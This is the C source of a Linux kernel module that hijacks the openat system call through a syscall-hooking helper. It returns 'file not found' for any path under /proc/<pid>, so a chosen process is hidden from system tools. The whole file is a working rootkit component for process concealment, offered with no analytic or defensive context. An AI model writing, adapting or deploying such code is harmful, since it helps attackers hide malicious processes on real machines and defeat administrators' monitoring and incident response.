#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/limits.h>
#include <stdbool.h>
#include "../common/syscall_hijacking/syscall_hijack.h"

// Function prototypes
void initialize_path_to_hide(void);

// Types & other consts.
static char *pid_to_hide = NULL;
module_param(pid_to_hide, charp, 0600);

static char *path_to_hide;

typedef int (*original_openat_t)(const struct pt_regs *regs);
static original_openat_t original_openat_ptr;

int new_openat(const struct pt_regs *regs) {
    char *path_name_ptr = (char*)regs->si;
    char *path;
    path = kmalloc(PATH_MAX, GFP_KERNEL);
    copy_from_user(path, path_name_ptr, PATH_MAX);

    // Incase pid to hide has been changed.
    initialize_path_to_hide();

    // If the target is contained within/is the path we're trying to hide, return an error.
    if (strstr(path, path_to_hide) != NULL) {
        kfree(path);
        return -ENOENT;
    }

    kfree(path);
    return original_openat_ptr(regs);
}

void initialize_path_to_hide(void) {
    char proc_path[] = "/proc/";
    sprintf(path_to_hide, "%s%s", proc_path, pid_to_hide);
}

int load(void) {
    pr_info("Initializing...");
    if (pid_to_hide == NULL) {
        pr_warn("Pid to hide has not been set! Exiting...");
        return -EINVAL;
    }

    path_to_hide = kmalloc(PATH_MAX, GFP_KERNEL);
    initialize_path_to_hide();

    unsigned long openat_ptr = hijack_syscall(__NR_openat, (unsigned long)new_openat);
    if (!openat_ptr) {
        return -ENXIO;
    }

    original_openat_ptr = (original_openat_t)openat_ptr;
    pr_info("Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    pr_info("Shutting down.");
    restore_syscall(__NR_openat, (unsigned long)original_openat_ptr);
    kfree(path_to_hide);
    pr_info("Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");